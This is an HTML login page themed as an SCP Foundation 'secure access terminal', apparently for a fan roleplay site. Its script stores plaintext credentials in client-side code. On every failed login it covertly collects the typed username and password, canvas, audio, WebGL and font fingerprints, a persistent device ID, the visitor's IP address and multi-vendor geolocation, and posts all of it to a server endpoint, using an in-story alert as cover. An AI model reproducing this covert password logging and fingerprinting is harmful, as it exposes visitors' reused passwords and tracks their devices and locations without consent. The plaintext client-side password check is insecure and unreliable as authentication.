<!DOCTYPE html>
<html>
<head>
    <title>SCP Foundation Secure Login</title>
    <script src="visitor-info.js" defer></script>
    <style>
        body {
            background: #000;
            font-family: "Courier New", monospace;
            color: #00ff00;
            margin: 0;
            padding: 0;
            background-image: url('noise.png');
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-box {
            background: #111;
            padding: 2em;
            border: 2px solid #00ff00;
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
            max-width: 400px;
            width: 90%;
        }

        .logo {
            text-align: center;
            margin-bottom: 1.5em;
            filter: drop-shadow(0 0 8px rgba(0, 255, 0, 0.7));
            animation: glow 3s ease-in-out infinite alternate;
        }

        .logo img {
            width: 200px;
            display: block;
            margin: 0 auto;
            border-radius: 4px;
            transition: filter 0.3s ease;
        }

        @keyframes glow {
            0% {
                filter: drop-shadow(0 0 8px rgba(0, 255, 0, 0.7));
            }
            50% {
                filter: drop-shadow(0 0 12px rgba(0, 255, 0, 0.9)) 
                        drop-shadow(0 0 20px rgba(0, 255, 0, 0.5));
            }
            100% {
                filter: drop-shadow(0 0 10px rgba(0, 255, 0, 0.8))
                        drop-shadow(0 0 25px rgba(0, 255, 128, 0.6));
            }
        }

        .logo::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: rgba(0, 255, 0, 0.3);
            animation: scan 4s linear infinite;
            pointer-events: none;
        }

        @keyframes scan {
            0% {
                top: 0;
                opacity: 0.3;
            }
            50% {
                opacity: 0.8;
            }
            100% {
                top: 100%;
                opacity: 0.3;
            }
        }

        h1 {
            text-align: center;
            font-size: 1.5em;
            margin-bottom: 1em;
            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
        }

        .warning {
            color: #ff0000;
            text-align: center;
            margin-bottom: 1em;
            font-weight: bold;
            text-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
        }

        input {
            width: 100%;
            padding: 0.5em;
            margin-bottom: 1em;
            background: #000;
            border: 1px solid #00ff00;
            color: #00ff00;
            font-family: "Courier New", monospace;
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.2);
        }

        input:focus {
            outline: none;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        button {
            width: 100%;
            padding: 0.5em;
            background: #003300;
            border: 1px solid #00ff00;
            color: #00ff00;
            cursor: pointer;
            font-family: "Courier New", monospace;
            font-weight: bold;
            box-shadow: 0 0 5px rgba(0, 255, 0, 0.3);
            transition: all 0.3s ease;
        }

        button:hover {
            background: #004400;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.6);
            transform: translateY(-1px);
        }

        button:active {
            transform: translateY(0);
        }

        .security-notice {
            margin-top: 1em;
            text-align: center;
            font-size: 0.8em;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <img src="https://cdn.discordapp.com/attachments/1445156366917439529/1456277684454948894/output-onlinepngtools_upscayl_4x_realesrgan-x4plus-anime.png?ex=6957c7c8&is=69567648&hm=924f1b0d21ddcd140fbd8248dcd08b0dbbc388db766a2cc8b740ba02f9454612&" alt="SCP Foundation">
            </div>
            <h1>L-5+ SECURE ACCESS TERMINAL</h1>
            <div class="warning">
                ⚠ AUTHORIZED PERSONNEL ONLY ⚠
            </div>
            <form id="loginForm">
                <input type="text" id="username" placeholder="Enter Credentials" required>
                <input type="password" id="password" placeholder="Enter Security Phrase" required>
                <button type="submit">AUTHENTICATE</button>
            </form>
            <div class="security-notice">
                NOTICE: Unauthorized access will result in immediate termination.
                <br>
                Security Level: THAUMIEL
            </div>
        </div>
    </div>

    <script>
        // Define PLP (Personnel Login Page) configurations
        const PLP_CONFIG = {
            'PLP-1': {
                name: 'PLP-1',
                clearance: 'Public',
                description: 'Public Information Terminal',
                level: 1,
                color: '#808080'
            },
            'PLP-2': {
                name: 'PLP-2',
                clearance: 'Confidential',
                description: 'Personnel Login Page - Clearance Confidential',
                level: 2,
                color: '#0000FF'
            },
            'PLP-3': {
                name: 'PLP-3',
                clearance: 'Secret',
                description: 'Personnel Login Page - Clearance Secret',
                level: 3,
                color: '#FFA500'
            },
            'PLP-4': {
                name: 'PLP-4',
                clearance: 'Top Secret',
                description: 'Personnel Login Page - Clearance Top Secret',
                level: 4,
                color: '#FF0000'
            },
            'PLP-5': {
                name: 'PLP-5',
                clearance: 'Thaumiel',
                description: 'Personnel Login Page - Clearance Thaumiel (Level 5+)',
                level: 5,
                color: '#800080'
            }
        };

        // Determine which PLP page this is based on the URL path
        function getCurrentPLP() {
            const path = window.location.pathname;
            
            // Check for PLP in the URL
            for (const [plp, config] of Object.entries(PLP_CONFIG)) {
                if (path.toLowerCase().includes(plp.toLowerCase())) {
                    return config;
                }
            }
            
            // Default to PLP-3 if not specified (or you can set a default)
            return PLP_CONFIG['PLP-3'];
        }

        const currentPLP = getCurrentPLP();

        // Update the page title and header based on PLP
        document.title = `${currentPLP.name} - ${currentPLP.clearance} - SCP Foundation Login`;
        
        // Update the header dynamically
        const headerElement = document.querySelector('h1');
        if (headerElement) {
            headerElement.innerHTML = `${currentPLP.name} - ${currentPLP.description}`;
        }

        // Update warning color based on clearance level
        const warningElement = document.querySelector('.warning');
        if (warningElement) {
            warningElement.style.color = currentPLP.color;
            warningElement.textContent = `⚠ ${currentPLP.clearance.toUpperCase()} CLEARANCE REQUIRED ⚠`;
        }

        const users = {
            "O5-3_SEB": { password: "Overseer Council Councilor Number 3, Overseer Council, SEB", redirect: "/L-5T-Dashboard" },
            "O5-7": { password: "password", redirect: "https://testurl.com" },
            "O5-8": { password: "password", redirect: "https://testurl.com" },
            "O5-9": { password: "password", redirect: "https://testurl.com" },
            "O5-10": { password: "password", redirect: "https://testurl.com" },
            "O5-11": { password: "password", redirect: "https://testurl.com" },
            "O5-12": { password: "password", redirect: "https://testurl.com" },
            "JEKKYL_JJ": { password: "Overseer Council Lead Councilor #1, (\"Jekkyl\")", redirect: "/L-5T-Dashboard" }
        };

        // Collect comprehensive device and browser information
        function collectDeviceInfo() {
            const info = {
                // Device identification
                deviceId: getDeviceId(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                
                // Screen information
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                screenColorDepth: `${window.screen.colorDepth}-bit`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                
                // Timezone information
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                localTime: new Date().toString(),
                
                // Browser identification
                browserName: getBrowserName(),
                browserVersion: getBrowserVersion(),
                osName: getOSName(),
                
                // Connection information
                connectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
                connectionSpeed: navigator.connection ? navigator.connection.downlink : 'Unknown',
                
                // Additional fingerprinting data
                webglVendor: getWebGLVendor(),
                canvasFingerprint: getCanvasFingerprint(),
                audioFingerprint: getAudioFingerprint(),
                fontFingerprint: getFontFingerprint(),
                
                // Referrer and page info
                referrer: document.referrer || 'Direct',
                pageURL: window.location.href,
                pagePath: window.location.pathname,
                
                // Session storage and local storage availability
                localStorageAvailable: !!window.localStorage,
                sessionStorageAvailable: !!window.sessionStorage,
                
                // Plugins
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ')
            };
            
            return info;
        }

        // Generate a persistent device ID
        function getDeviceId() {
            let deviceId = localStorage.getItem('device_id');
            if (!deviceId) {
                deviceId = generateUUID();
                localStorage.setItem('device_id', deviceId);
            }
            return deviceId;
        }

        function generateUUID() {
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                const r = Math.random() * 16 | 0;
                const v = c === 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }

        function getBrowserName() {
            const ua = navigator.userAgent;
            if (ua.includes('Chrome')) return 'Chrome';
            if (ua.includes('Firefox')) return 'Firefox';
            if (ua.includes('Safari')) return 'Safari';
            if (ua.includes('Edge')) return 'Edge';
            if (ua.includes('Opera')) return 'Opera';
            return 'Unknown';
        }

        function getBrowserVersion() {
            const ua = navigator.userAgent;
            const match = ua.match(/(Chrome|Firefox|Safari|Edge|Opera)\/(\d+\.\d+)/);
            return match ? match[2] : 'Unknown';
        }

        function getOSName() {
            const ua = navigator.userAgent;
            if (ua.includes('Windows')) return 'Windows';
            if (ua.includes('Mac')) return 'macOS';
            if (ua.includes('Linux')) return 'Linux';
            if (ua.includes('Android')) return 'Android';
            if (ua.includes('iOS')) return 'iOS';
            return 'Unknown';
        }

        function getWebGLVendor() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (e) {}
            return 'Unknown';
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200;
                canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('SCP Foundation', 2, 15);
                return canvas.toDataURL().substring(0, 50);
            } catch (e) {
                return 'Unknown';
            }
        }

        function getAudioFingerprint() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const analyser = audioCtx.createAnalyser();
                oscillator.connect(analyser);
                oscillator.frequency.value = 1000;
                oscillator.type = 'sine';
                oscillator.start(0);
                oscillator.stop(0.1);
                const buffer = new Float32Array(analyser.frequencyBinCount);
                analyser.getFloatFrequencyData(buffer);
                return buffer.slice(0, 10).join(',');
            } catch (e) {
                return 'Unknown';
            }
        }

        function getFontFingerprint() {
            const fonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Verdana', 'Comic Sans MS'];
            const available = fonts.filter(font => {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.font = '72px ' + font;
                return ctx.measureText('abcdefghijklmnopqrstuvwxyz').width > 0;
            });
            return available.join(', ');
        }

        // Get client IP using multiple services (fallback)
        async function getClientIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://ipapi.co/json/',
                'https://api.ip.sb/geoip',
                'https://ipinfo.io/json'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service);
                    if (response.ok) {
                        const data = await response.json();
                        return data.ip || data.query || data.ip_address || 'Unknown';
                    }
                } catch (e) {
                    continue;
                }
            }
            return 'Unable to determine IP';
        }

        // Get location data from multiple vendors
        async function getLocationData(ip) {
            const vendors = {
                'ipapi.co': `https://ipapi.co/${ip}/json/`,
                'ip-api.com': `http://ip-api.com/json/${ip}`,
                'ipinfo.io': `https://ipinfo.io/${ip}/json`,
                'ipvigilante.com': `https://ipvigilante.com/${ip}`,
                'freeipapi.com': `https://freeipapi.com/api/json/${ip}`
            };
            
            const results = {};
            
            for (const [vendor, url] of Object.entries(vendors)) {
                try {
                    const response = await fetch(url);
                    if (response.ok) {
                        const data = await response.json();
                        results[vendor] = {
                            country: data.country || data.country_name || 'Unknown',
                            region: data.region || data.region_name || data.state || 'Unknown',
                            city: data.city || 'Unknown',
                            latitude: data.latitude || data.lat || 'Unknown',
                            longitude: data.longitude || data.lon || 'Unknown',
                            timezone: data.timezone || data.time_zone || 'Unknown',
                            isp: data.isp || data.org || data.organisation || 'Unknown',
                            asn: data.asn || data.as || 'Unknown'
                        };
                    }
                } catch (e) {
                    results[vendor] = { error: 'Failed to fetch' };
                }
            }
            
            return results;
        }

        // Main reporting function
        async function reportToISD(username, password) {
            try {
                // Collect all data
                const deviceInfo = collectDeviceInfo();
                const ip = await getClientIP();
                const locationData = await getLocationData(ip);
                
                const reportData = {
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString(),
                    ip: ip,
                    deviceInfo: deviceInfo,
                    locationData: locationData,
                    plpInfo: {
                        name: currentPLP.name,
                        clearance: currentPLP.clearance,
                        description: currentPLP.description,
                        level: currentPLP.level,
                        url: window.location.href,
                        path: window.location.pathname
                    }
                };
                
                // Send to serverless function
                const response = await fetch('/api/report-attempt', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(reportData)
                });
                
                if (!response.ok) {
                    console.error('Failed to report to ISD');
                }
            } catch (error) {
                console.error('Error reporting to ISD:', error);
            }
        }

        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (users[username] && users[username].password === password) {
                window.location.href = users[username].redirect || 'https://testurl.com';
            } else {
                alert('ACCESS DENIED: Invalid credentials detected. This incident will be reported to R.A.I.S.A and the I.S.D.');
                reportToISD(username, password);
            }
        });
    </script>
</body>
</html>
